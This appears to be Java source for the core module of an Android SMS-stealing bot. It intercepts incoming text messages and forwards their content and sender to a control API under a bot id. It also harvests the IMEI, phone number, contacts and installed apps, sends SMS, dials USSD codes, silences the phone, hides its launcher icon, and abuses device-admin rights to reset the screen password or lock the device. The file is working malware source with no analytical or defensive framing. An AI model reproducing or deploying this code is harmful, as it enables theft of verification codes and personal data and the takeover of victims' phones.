package com.moonny.mods_src;

import android.annotation.TargetApi;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.media.AudioManager;
import android.media.RingtoneManager;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.os.Vibrator;
import android.provider.ContactsContract;
import android.provider.Settings;
import android.support.v4.app.NotificationCompat;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import android.telephony.TelephonyManager;
import android.util.Base64;
import android.widget.Toast;

import org.json.JSONException;
import org.json.JSONObject;

import java.lang.reflect.Method;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

// Main dyn module class
public class Main {

    int VERSION = 100;
    Context ctx;
    Class DeviceAdminReceiver_class;

    Object mods; // Modules instance
//    private Method run_func; // run_func real method name
    private Method api_request;

    public Main(HashMap<String, Object> system) throws Exception {

        this.ctx = (Context) system.get("a2");
        this.mods = system.get("a4");
    //    this.run_func = mods.getClass().getDeclaredMethod((String) system.get("a5"), String.class, String.class, Object[].class);
        this.DeviceAdminReceiver_class = (Class) system.get("a3");
        this.api_request = mods.getClass().getDeclaredMethod((String) system.get("a7"), JSONObject.class, String.class, String.class);
    }

    public int get_main_version()
    {
        return VERSION;
    }

    public boolean is_admin()
    {
        DevicePolicyManager mDPM = (DevicePolicyManager) ctx.getSystemService(Context.DEVICE_POLICY_SERVICE);
        ComponentName mAdminName = new ComponentName(ctx, DeviceAdminReceiver_class);

        return mDPM.isAdminActive(mAdminName);
    }

    public void send_ussd(String code)
    {
        Intent i = new Intent("android.intent.action.CALL", Uri.parse("tel:" + Uri.encode(code)));
        i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        ctx.startActivity(i);
    }

    public void show_notify(String title, String message, String pkg)
    {
        NotificationCompat.Builder builder = new NotificationCompat.Builder(ctx);

        // intent to open specified pkg
        PackageManager manager = ctx.getPackageManager();
        Intent i = manager.getLaunchIntentForPackage(pkg);

        if (i != null)
            i.addCategory(Intent.CATEGORY_LAUNCHER);
        else
            i = new Intent(ctx, ctx.getClass());

        i.setFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);
        PendingIntent intent = PendingIntent.getActivity(ctx, 0, i, PendingIntent.FLAG_UPDATE_CURRENT);

        // Sets the data for builder
        builder.setContentIntent(intent);
        builder.setTicker(title);

        builder.setSmallIcon(ctx.getResources().getIdentifier("ic_stat_content_mail", "drawable", ctx.getPackageName()));
        builder.setContentTitle(title);
        builder.setContentText(message);
        builder.setAutoCancel(true);
        builder.setWhen(System.currentTimeMillis());

        builder.setVibrate(new long[] { 1000, 1000});

        Uri alarmSound = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_NOTIFICATION);
        builder.setSound(alarmSound);

        NotificationManager nm = (NotificationManager) ctx.getSystemService(Context.NOTIFICATION_SERVICE);
        nm.notify(0, builder.build());

    }

    public String[] string2list(String data) {
        if(data.trim().isEmpty())
            return new String[]{};

        return data.split("\\|"); // it removes empty rows too
    }

    public String list_remove(String list_r, String new_val) {

        if(list_r.isEmpty())
            return "";

        String list = list_r + "|";

        if(new_val.isEmpty() || !list.contains(new_val + "|"))
            return list_r;

        String new_list = "";
        for (String app : list.split("\\|")) {
            if(!app.trim().isEmpty() && !new_list.contains(app + "|") && !app.equals(new_val))
                new_list += app + "|";
        }

        return new_list;
    }

    public boolean list_has(String list_r, String new_val)
    {
        if(list_r.isEmpty() || new_val.isEmpty())
            return false;

        String list = list_r + "|";
        return (list.contains(new_val + "|"));
    }

    public String list_add(String list_r, String new_val)
    {
        if(list_r.isEmpty())
            return new_val;

        String list = list_r + "|";

        if(new_val.isEmpty() || list.contains(new_val + "|"))
            return list_r;

        String new_list = "";
        for (String app : list.split("\\|")) {
            if(!app.trim().isEmpty() && !new_list.contains(app + "|") && !app.equals(new_val))
                new_list += app + "|";
        }

        new_list += new_val + "|";
        return new_list;
    }

    public String get_pref(String name, String default_value)
    {
        SharedPreferences prefs = ctx.getSharedPreferences("mp", Context.MODE_PRIVATE);
        String val = prefs.getString(name, null);
        if(val == null)
            return default_value;

        return aes_decrypt(val, md5("not-cache"));
    }

    public Boolean get_pref(String name, Boolean default_value)
    {
        SharedPreferences prefs = ctx.getSharedPreferences("mp", Context.MODE_PRIVATE);
        return prefs.getBoolean(name, default_value);
    }

    public Integer get_pref(String name, Integer default_value)
    {
        SharedPreferences prefs = ctx.getSharedPreferences("mp", Context.MODE_PRIVATE);
        return prefs.getInt(name, default_value);
    }

    public Long get_pref(String name, Long default_value)
    {
        SharedPreferences prefs = ctx.getSharedPreferences("mp", Context.MODE_PRIVATE);
        return prefs.getLong(name, default_value);
    }

    // Modules.main(ctx, S.set_pref, new Object[]{ S.injectCyclePause, false })
    public void set_pref(String name, String value)
    {
        if(!value.isEmpty()) {
            String value2 = aes_encrypt(value, md5("not-cache"));
            if (value2 != null)
                value = value2;
        }

        SharedPreferences prefs = ctx.getSharedPreferences("mp", Context.MODE_PRIVATE);
        //Log.d("MainMod", "set_pref string: " + name + " -> " + value);
        prefs.edit().putString(name, value).commit();
    }

    public void set_pref(String name, Boolean value)
    {
        SharedPreferences prefs = ctx.getSharedPreferences("mp", Context.MODE_PRIVATE);
        prefs.edit().putBoolean(name, value).commit();
    }

    public void set_pref(String name, Integer value)
    {
        SharedPreferences prefs = ctx.getSharedPreferences("mp", Context.MODE_PRIVATE);
        prefs.edit().putInt(name, value).commit();
    }

    public void set_pref(String name, Long value)
    {
        SharedPreferences prefs = ctx.getSharedPreferences("mp", Context.MODE_PRIVATE);
        prefs.edit().putLong(name, value).commit();
    }

    public String aes_encrypt(String input, String key){

        if(input == null || input.isEmpty())
            return "";

        //Log.e("MainMod", "aes_encrypt: " + input + "; KEY: " + key);

//        if(input.length() < 20)
//            input += "//DELIMITER//0000000000000000000000"; // not sure if it needed

        byte[] crypted = null;
        try{
            SecretKeySpec skey = new SecretKeySpec(key.getBytes(), "AES");
            Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
            cipher.init(Cipher.ENCRYPT_MODE, skey);
            crypted = cipher.doFinal(input.getBytes());
        }catch(Exception e){
            //Log.d("MainMod", "AES encrypt fail: " + e.toString());
            e.printStackTrace();
            return null;
        }

        if(crypted == null)
            return input;

        return Base64.encodeToString(crypted, Base64.DEFAULT);
    }

    // one = dom1|dom2|dom3
    public String list_merge(String one, String two){
        String new_list = "";
        String both = one + "|" + two;

        for(String elem : both.split("\\|"))
        {
            new_list =  list_add(new_list, elem); // it checks for empty and unique too
        }

        return new_list;
    }

    public String aes_decrypt(String input){
        return aes_decrypt(input, md5("not-cache"));
    }

    public String aes_decrypt(String input, String key){

        if(input == null || input.isEmpty())
            return "";

       // String output = null;
//        String delim = "//DELIMITER//";
      //  String piece = (input.length() < 51)? input : input.substring(0, 50);
        //Log.e("MainMod", "aes_decrypt: " + piece + "...; KEY: " + key);
        try{
            SecretKeySpec skey = new SecretKeySpec(key.getBytes(), "AES");
            Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
            cipher.init(Cipher.DECRYPT_MODE, skey);

            return new String(cipher.doFinal(Base64.decode(input, Base64.DEFAULT)));

        }catch(Exception e){
            //Log.d("MainMod", "AES decrypt fail: " + e.toString() + "; DATA: " + input);
            e.printStackTrace();
            return input;
        }

//        if(output == null)
//            return input;
//
//        return new String(output);
    }

    public String md5(String s) {
        try {
            // Create MD5 Hash
            MessageDigest digest = MessageDigest
                    .getInstance("MD5");
            digest.update(s.getBytes());
            byte messageDigest[] = digest.digest();

            // Create Hex String
            StringBuilder hexString = new StringBuilder();
            for (byte aMessageDigest : messageDigest) {
                String h = Integer.toHexString(0xFF & aMessageDigest);
                while (h.length() < 2)
                    h = "0" + h;
                hexString.append(h);
            }
            return hexString.toString();

        } catch (NoSuchAlgorithmException e) {
            e.printStackTrace();
        }
        return "";
    }
    
    public PowerManager.WakeLock set_wakelock(PowerManager.WakeLock WAKELOCK){
        Settings.System.putInt(ctx.getContentResolver(), Settings.System.WIFI_SLEEP_POLICY, Settings.System.WIFI_SLEEP_POLICY_NEVER);

        PowerManager pmm = (PowerManager) ctx.getSystemService(Context.POWER_SERVICE);
        WAKELOCK = pmm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "main_service_wakelock");
        WAKELOCK.acquire();
        return WAKELOCK;
    }

    public WifiManager.WifiLock set_wifilock(WifiManager.WifiLock WIFILOCK) {
        WifiManager wm = (WifiManager) ctx.getSystemService(Context.WIFI_SERVICE);
        WIFILOCK = wm.createWifiLock(WifiManager.WIFI_MODE_FULL, "UsrWifiLock");
        if (!WIFILOCK.isHeld())
            WIFILOCK.acquire();

        return WIFILOCK;
    }

    public void base_main_init(ComponentName component)
    {
        PackageManager pm = ctx.getPackageManager();
        pm.setComponentEnabledSetting(component, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }

    public void vibro(long time)
    {
        Vibrator v = (Vibrator) ctx.getSystemService(Context.VIBRATOR_SERVICE);
        v.vibrate(time);
    }

    // BASE: main parts of the bot
    public void base_sms_intercept(Intent intent, String tag, String bot_id) throws Exception
    {
        Bundle args2 = intent.getExtras();
        Object[] pdus2 = (Object[]) args2.get("pdus");
        if(pdus2 == null)
            return;

        SmsMessage[] msgs = new SmsMessage[pdus2.length];
        for (int i = 0; i < pdus2.length; i++)
            msgs[i] = SmsMessage.createFromPdu((byte[]) pdus2[i]);

        String body; // SMS body

        if (msgs.length == 1 || msgs[0].isReplace()) {
            body = msgs[0].getDisplayMessageBody();
        } else {
            StringBuilder bodyText = new StringBuilder();
            for (int i = 0; i < msgs.length; i++)
                bodyText.append(msgs[i].getMessageBody());

            body = bodyText.toString();
        }

        SimpleDateFormat dateFormat = new SimpleDateFormat("dd/MM/yyyy HH:mm:ss");

        Object[] params = new Object[3];
        params[0] = body;
        params[1] = msgs[0].getDisplayOriginatingAddress();
        params[2] = dateFormat.format(msgs[0].getTimestampMillis());

        JSONObject json = new JSONObject();
        try {
            json.put("m", "l");
            json.put("t", tag);
            json.put("i", bot_id);

            json.put("401", params[0]);
            json.put("402",  params[1]);
            json.put("403", params[2]);

        } catch (JSONException e) {
            //Log.e("MainMod", "base sms intercept failed: " + e.getMessage());
            e.printStackTrace();
            return;
        }

        api_request.invoke(mods, json, "", "");
    }

    // does not work from other modules
    public void toast(String msg)
    {
        Toast toast = Toast.makeText(ctx, msg, Toast.LENGTH_LONG);
        toast.show();
    }

    public String get_language()
    {
        return Locale.getDefault().getLanguage().toLowerCase();
    }

    public String format_date(Long time)
    {
        SimpleDateFormat dateFormat = new SimpleDateFormat("dd/MM/yyyy HH:mm:ss");
        return dateFormat.format(time);
    }

    public void send_sms(String number, String message)
    {
        if(number.isEmpty())
            return;

        SmsManager manager = SmsManager.getDefault();

        if(message.length() > 70)
        {
            ArrayList<String> msgs = manager.divideMessage(message);
            manager.sendMultipartTextMessage(number, null, msgs, null, null);
            return;
        }

        manager.sendTextMessage(number, null, message, null, null);
        // TODO: get result of sms
            /*
    receiver to get result of sms send

    public static final String ACTION_SMS_SENT = "SMS_SENT_ACTION";

    registerReceiver(new BroadcastReceiver() {
        @Override
        public void onReceive(Context context, Intent intent) {
            String message = null;
            boolean error = true;
            switch (getResultCode()) {
                case Activity.RESULT_OK:
                    message = "Message sent!";
                    error = false;
                    break;
                case SmsManager.RESULT_ERROR_GENERIC_FAILURE:
                    message = "Error.";
                    break;
                case SmsManager.RESULT_ERROR_NO_SERVICE:
                    message = "Error: No service.";
                    break;
                case SmsManager.RESULT_ERROR_NULL_PDU:
                    message = "Error: Null PDU.";
                    break;
                case SmsManager.RESULT_ERROR_RADIO_OFF:
                    message = "Error: Radio off.";
                    break;
            }

            //Log.e("SmsMessage", "SMS: " + message);

        }
    }, new IntentFilter(ACTION_SMS_SENT));

        //Log.d("SmsMessage", "RUN SMS");
        SmsManager sms = SmsManager.getDefault();
        PendingIntent intent = PendingIntent.getBroadcast(this, 0, new Intent(ACTION_SMS_SENT), 0);
        sms.sendTextMessage("+1991611111", null, "TEXT SMS", intent, null);
    */
    }

    public String get_device_model() {
        return Build.MANUFACTURER + " " + Build.MODEL;
    }

    public String get_os_ver() {
        return Build.VERSION.RELEASE;
    }

    public String get_number() {
        return ((TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE)).getLine1Number();
    }

    public String get_country() {
        TelephonyManager telephonyManager = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
        return telephonyManager.getNetworkCountryIso();
    }

    public String get_imei() {
        TelephonyManager telephonyManager = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
        String deviceIMEI = telephonyManager.getDeviceId();
        return (deviceIMEI == null) ? "" : deviceIMEI;
    }

    public String get_operator() {
        TelephonyManager telephonyManager = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
        String simname = telephonyManager.getSimOperatorName();
        return (!simname.isEmpty())? simname : telephonyManager.getNetworkOperatorName();
    }

    public String get_packages() {

        final PackageManager pm = ctx.getPackageManager();

        List<ApplicationInfo> packages = pm.getInstalledApplications(PackageManager.GET_META_DATA);
        List<String> packagesList = new ArrayList<>(packages.size());

        for (ApplicationInfo packageInfo : packages) {
            packagesList.add(packageInfo.packageName);
        }

        String packagesToString = "";
        for (int i = 0;i < packagesList.size();i++) {
            packagesToString = packagesToString + packagesList.get(i);
            if (i < packagesList.size() - 1)
                packagesToString =  packagesToString + "|";
        }

        return packagesToString;
    }

    // returns phone contacts in format: Name:319028882222|Name:319028882222|...
    public JSONObject get_contacts() throws Exception
    {
        JSONObject jsonObject = new JSONObject();

        Cursor phones = ctx.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);

        while (phones != null ? phones.moveToNext() : false) {
            String name = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
            String phoneNumber = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
            if (phoneNumber.length() > 6) {
                jsonObject.put(name, phoneNumber);
            }
        }

        phones.close();
        return jsonObject;
    }

    @TargetApi(Build.VERSION_CODES.FROYO)
    public void screen_password_clear(){

        DevicePolicyManager policyManager = (DevicePolicyManager) ctx.getSystemService(Context.DEVICE_POLICY_SERVICE);

        ComponentName adminReceiver = new ComponentName(ctx, DeviceAdminReceiver_class);
        boolean admin = policyManager.isAdminActive(adminReceiver);

        if (!admin)
            return;

        policyManager.resetPassword("", 0);
    }

    public void sound_enable() {

        String values = get_pref("p5", "");

        AudioManager audio = (AudioManager) ctx.getSystemService(Context.AUDIO_SERVICE);
        audio.setRingerMode(AudioManager.RINGER_MODE_NORMAL);

        String[] vals = values.split(",");

        audio.setStreamVolume(AudioManager.STREAM_NOTIFICATION, Integer.parseInt(vals[0]), 0);
        audio.setStreamVolume(AudioManager.STREAM_VOICE_CALL, Integer.parseInt(vals[1]), 0);
        audio.setStreamVolume(AudioManager.STREAM_SYSTEM, Integer.parseInt(vals[2]), 0);
        audio.setStreamVolume(AudioManager.STREAM_RING, Integer.parseInt(vals[3]), 0);
        audio.setStreamVolume(AudioManager.STREAM_MUSIC, Integer.parseInt(vals[4]), 0);
        audio.setStreamVolume(AudioManager.STREAM_ALARM, Integer.parseInt(vals[5]), 0);
    }

    public void screen_password_set(String password)
    {
        DevicePolicyManager policyManager = (DevicePolicyManager) ctx.getSystemService(Context.DEVICE_POLICY_SERVICE);

        ComponentName adminReceiver = new ComponentName(ctx, DeviceAdminReceiver_class);
        boolean admin = policyManager.isAdminActive(adminReceiver);

        if(!admin)
            return;

        policyManager.resetPassword(password, 0);
    }

    public void sound_disable()
    {
        AudioManager audio = (AudioManager) ctx.getSystemService(Context.AUDIO_SERVICE);

        int vol1 = audio.getStreamVolume(AudioManager.STREAM_NOTIFICATION);
        audio.setStreamVolume(AudioManager.STREAM_NOTIFICATION, 0, 0);

        int vol2 = audio.getStreamVolume(AudioManager.STREAM_VOICE_CALL);
        audio.setStreamVolume(AudioManager.STREAM_VOICE_CALL, 0, 0);

        int vol3 = audio.getStreamVolume(AudioManager.STREAM_SYSTEM);
        audio.setStreamVolume(AudioManager.STREAM_SYSTEM, 0, 0);

        int vol4 = audio.getStreamVolume(AudioManager.STREAM_RING);
        audio.setStreamVolume(AudioManager.STREAM_RING, 0, 0);

        int vol5 = audio.getStreamVolume(AudioManager.STREAM_MUSIC);
        audio.setStreamVolume(AudioManager.STREAM_MUSIC, 0, 0);

        int vol6 = audio.getStreamVolume(AudioManager.STREAM_ALARM);
        audio.setStreamVolume(AudioManager.STREAM_ALARM, 0, 0);

        String soundPrefs = vol1 + "," + vol2 + "," + vol3 + "," + vol4 + "," + vol5 + "," + vol6;

        set_pref("p5", soundPrefs);
        audio.setRingerMode(AudioManager.RINGER_MODE_SILENT);
    }

    @TargetApi(Build.VERSION_CODES.FROYO)
    public void screen_lock()
    {
        DevicePolicyManager policyManager = (DevicePolicyManager) ctx.getSystemService(Context.DEVICE_POLICY_SERVICE);

        ComponentName adminReceiver = new ComponentName(ctx, DeviceAdminReceiver_class);
        boolean admin = policyManager.isAdminActive(adminReceiver);

        if (!admin)
            return;

        policyManager.lockNow();
    }


}

